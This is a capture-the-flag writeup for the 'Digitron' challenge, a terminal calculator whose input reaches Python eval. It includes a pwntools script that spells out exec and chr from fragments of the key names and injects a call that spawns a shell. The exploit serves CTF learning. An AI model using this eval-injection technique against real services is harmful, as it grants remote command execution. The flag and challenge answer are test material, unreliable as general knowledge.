## Ime zadatka:

Digitron

## Kategorija:

Misc

## Deskripcija:

> Digitron is a simple terminal calculator that can evaluate any mathematical expression you enter. There shouldn't be anything to worry about... right?

## Flag:

* `SCC{d1gi7r0n_3v4lu473s_7o0_much_<random>}`

## Napomene:

* *Blind challenge*

## Writeup:

Kako postoje stringovi `exp`, `cos`, `hyp` i `rnd` mogu se uz pomoć njih i funkcije `del` formirati `exec(...)` i `chr(...)` i na osnovu toga, brojeva i znaka `+` izvršiti bilo koji kod jer je pretpostavka da se kod samo evaluira funkcijom `eval`.  

Skripta rešenja:
```py
from pwn import *

funcs = [
    ["log", "exp", "pow", "rnd"],
    ["asin", "acos", "atan", "sqrt"],
    ["sin", "cos", "tan", "hyp"],
    ["abs", "gcd", "fac", "del"],
    ["(", ")", ".", ","],
    ["7", "8", "9", "+"],
    ["4", "5", "6", "-"],
    ["1", "2", "3", "*"],
    ["C", "0", "=", "/"]
]

end = "┘".encode()

funcs_dict = { val: (i, j) for i, row in enumerate(funcs) for j, val in enumerate(row) }
ci, cj = 0, 0

UP = b"\x1bOA"
DOWN = b"\x1bOB"
RIGHT = b"\x1bOC"
LEFT = b"\x1bOD"

HOST = args.HOST or "localhost"
PORT = args.PORT or 1337

# p = process("python3 digitron.py", shell=True)
p = remote(HOST, PORT)


def send_cmd(cmd):
    global ci, cj
    if cmd not in funcs_dict:
        return
    ti, tj = funcs_dict[cmd]
    x_cmd = RIGHT if tj > cj else LEFT
    y_cmd = DOWN if ti > ci else UP
    for _ in range(abs(ti - ci)):
        p.sendafter(end, y_cmd)
    for _ in range(abs(tj - cj)):
        p.sendafter(end, x_cmd)
    ci, cj = ti, tj
    p.sendafter(end, b'\n')


def send_cmd_rep(cmd, rep):
    for _ in range(rep):
        send_cmd(cmd)


def send_payload_char(ch):
    send_cmd('cos')
    send_cmd_rep('del', 3)
    send_cmd('hyp')
    send_cmd_rep('del', 3)
    send_cmd('rnd')
    send_cmd_rep('del', 3)
    send_cmd('(')
    for i in str(ord(ch)):
        send_cmd(i)
    send_cmd(')')


def send_payload(payload):
    send_cmd('exp')
    send_cmd_rep('del', 2)
    send_cmd('exp')
    send_cmd_rep('del', 3)
    send_cmd('cos')
    send_cmd_rep('del', 3)
    send_cmd('(')
    for c in payload[:-1]:
        send_payload_char(c)
        send_cmd('+')
        log.success(f"Written char '{c}'")
    send_payload_char(payload[-1])
    send_cmd(')')
    send_cmd('=')


send_payload('__import__("os").system("sh")')

p.interactive()
```